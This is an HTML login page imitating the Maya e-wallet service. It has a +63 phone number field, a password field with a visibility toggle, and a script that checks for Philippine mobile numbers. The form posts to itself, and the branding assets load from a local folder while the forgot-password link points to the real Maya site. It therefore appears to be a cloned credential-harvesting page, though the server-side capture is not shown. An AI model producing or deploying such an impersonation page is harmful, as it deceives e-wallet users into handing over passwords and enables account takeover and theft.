<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=Noto+Sans:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./style/maya.css?v=2.8">
    <link rel="icon" href="./style/favicon.png">
    <title>Maya | Login</title>
</head>
<body>
<div class="container">
    <div class="login">
        <div class="logo">
            <img height="120px" src="./style/maya.png" alt="maya-logo">
        </div>
        <form action="" method="POST">
            <div class="input1">
                <p>+63</p>
                <div class="box">
                    <input id="username" type="text" name="username" placeholder="Phone number" required>
                </div>
            </div>
            <div class="input2">
                <label for="password">Password</label>
                <input id="password" type="password" name="password" placeholder="Enter password" required>
                <svg id="eye" version="1.1" xmlns="http://www.w3.org/2000/svg" width="48" height="48">
<path d="M0 0 C3 1 3 1 5.3125 3.375 C9.57359184 7.53699668 13.07978601 9.17085469 19 9.375 C24.9218443 9.17079847 28.45101241 7.58586825 32.625 3.3125 C35 1 35 1 39 1 C39.66 2.32 40.32 3.64 41 5 C40.54367188 5.43570312 40.08734375 5.87140625 39.6171875 6.3203125 C37.85320515 8.14757672 36.33167948 9.83385902 35 12 C35.43637654 15.40125706 35.43637654 15.40125706 37 18 C35.35 18.66 33.7 19.32 32 20 C30.68 18.35 29.36 16.7 28 15 C26.02 15.33 24.04 15.66 22 16 C22 17.98 22 19.96 22 22 C20.02 22 18.04 22 16 22 C16 20.02 16 18.04 16 16 C13.69 15.67 11.38 15.34 9 15 C7.515 17.475 7.515 17.475 6 20 C3.525 19.01 3.525 19.01 1 18 C1.66 15.69 2.32 13.38 3 11 C2.566875 10.60167969 2.13375 10.20335937 1.6875 9.79296875 C0.8521875 8.99826172 0.8521875 8.99826172 0 8.1875 C-0.8353125 7.40439453 -0.8353125 7.40439453 -1.6875 6.60546875 C-3 5 -3 5 -3 2 C-2.01 1.34 -1.02 0.68 0 0 Z " fill="#000000" transform="translate(5,15)"/>
</svg>
<svg id="eye2" version="1.1" xmlns="http://www.w3.org/2000/svg" width="48" height="48">
<path d="M0 0 C1.65 0 3.3 0 5 0 C5 2.31 5 4.62 5 7 C7.64 7.33 10.28 7.66 13 8 C13.99 6.68 14.98 5.36 16 4 C18.475 4.99 18.475 4.99 21 6 C20.4740625 6.86625 20.4740625 6.86625 19.9375 7.75 C18.86620679 9.88259726 18.86620679 9.88259726 19.0625 11.875 C20.00089101 14.30777552 20.00089101 14.30777552 22.625 16.875 C25 20 25 20 25.25 22.9375 C22.84774216 28.8230317 17.62899369 33.37909721 12.00390625 36.2734375 C4.70400796 38.92018425 -1.7872227 38.45806416 -8.7734375 35.2421875 C-11.97211299 33.45766328 -14.37106412 31.5648155 -17 29 C-17.639375 28.38125 -18.27875 27.7625 -18.9375 27.125 C-20.62661298 23.74677405 -19.9877731 21.58067747 -19 18 C-17.49747207 15.74867127 -15.87834802 13.97467356 -14 12 C-14.99 10.02 -15.98 8.04 -17 6 C-15.35 5.34 -13.7 4.68 -12 4 C-10.5 5.375 -10.5 5.375 -9 7 C-9 7.66 -9 8.32 -9 9 C-8.2575 8.67 -7.515 8.34 -6.75 8 C-4 7 -4 7 0 7 C0 4.69 0 2.38 0 0 Z M-11.5 18.1875 C-12.7375 19.5796875 -12.7375 19.5796875 -14 21 C-12.80838951 25.63404081 -10.53344734 27.4048178 -6.75390625 29.984375 C-2.39313418 32.50954368 2.10956162 32.70428643 7 32 C12.15932534 29.81860104 15.82772476 26.62623473 19 22 C15.73706879 17.48209524 12.42675385 13.93456923 6.89453125 12.42578125 C-0.51585205 11.23960974 -6.15321824 12.90332692 -11.5 18.1875 Z " fill="#000000" transform="translate(22,4)"/>
<path d="M0 0 C2.5 2.125 2.5 2.125 4 5 C3.93550016 8.22499219 3.58491853 10.15186814 1.75 12.8125 C-0.58992192 14.40030416 -2.16582395 14.86503924 -5 15 C-7.2831838 13.8584081 -9.19012683 12.80987317 -11 11 C-11.360388 7.17988724 -11.54048663 4.84315915 -9.4375 1.5625 C-6.03280512 -0.61999672 -3.96569988 -0.63734462 0 0 Z " fill="#000000" transform="translate(28,19)"/>
</svg>
            </div>
            <div class="forgot-password">
                <a href="https://online.maya.ph/forgot-password">Forgot your password?</a>
            </div>
            <div class="btn">
                <button id="btn" type="submit">Log In</button>
            </div>
        </form>
    </div>
</div>
<script>
    const password = document.getElementById("password");
    const eye = document.getElementById("eye");
    const eye2 = document.getElementById("eye2")
    
    eye2.style = "display: none";

    eye.onclick = function (){
        if(password.type === "password"){
            password.type = "text";
            eye.style = "display: none";
            eye2.style = "";
        }
    }
    eye2.onclick = function (){
        if(password.type === "text"){
            password.type = "password";
            eye.style = "";
            eye2.style = "display: none";
        }
    }

    const username = document.getElementById("username");
    const button = document.getElementById("btn");

    button.disabled = true
    function checkFields() {
        if (username.value.length > 0 && password.value.length > 0 && (username.value.startsWith("9") || username.value.startsWith("09"))) {
            button.disabled = false;
        } else {
            button.disabled = true;
        }
    }
    
    username.addEventListener("keyup", checkFields);
    password.addEventListener("keyup", checkFields);
</script>
</body>
</html>